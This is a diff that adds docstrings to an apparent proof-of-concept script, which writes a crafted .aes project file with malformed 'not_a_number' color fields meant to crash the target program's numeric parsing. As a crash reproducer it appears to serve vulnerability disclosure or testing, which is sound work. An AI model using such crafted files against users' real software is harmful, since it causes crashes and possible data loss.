@@ -8,7 +8,14 @@ Difficulty: Script Kiddie
 import json, sys, os
 
 def build_malicious_aes():
-    """Minimal .aes project with a unit containing a malformed color value."""
+    """
+    Builds a minimal .aes project payload containing malformed color fields intended to trigger numeric parsing errors.
+    
+    The returned dictionary represents a minimal project with top-level keys: `version`, `tempo`, `playhead`, `lanes`, `sources`, `patterns`, and `arsenal`. One lane and one arsenal unit are included; both have their `color` fields set to the string "not_a_number".
+    
+    Returns:
+        dict: Project data ready for JSON serialization. The `lanes[0]["color"]` and `arsenal["units"][0]["color"]` entries contain the malformed string "not_a_number".
+    """
     return {
         "version": 1,
         "tempo": 120.0,
@@ -41,6 +48,11 @@ def build_malicious_aes():
     }
 
 def main():
+    """
+    Write a crafted .aes JSON project (with malformed `color` fields) to a file and print the output path, size, and informational messages.
+    
+    The output filename is taken from the first command-line argument if present; otherwise it defaults to "poc_stoul_crash.aes". Builds the malicious project via build_malicious_aes(), writes it as indented JSON, then prints the filename and byte size followed by fixed informational lines describing the targeted crash location.
+    """
     output = sys.argv[1] if len(sys.argv) > 1 else 'poc_stoul_crash.aes'
     project = build_malicious_aes()
     with open(output, 'w') as f:
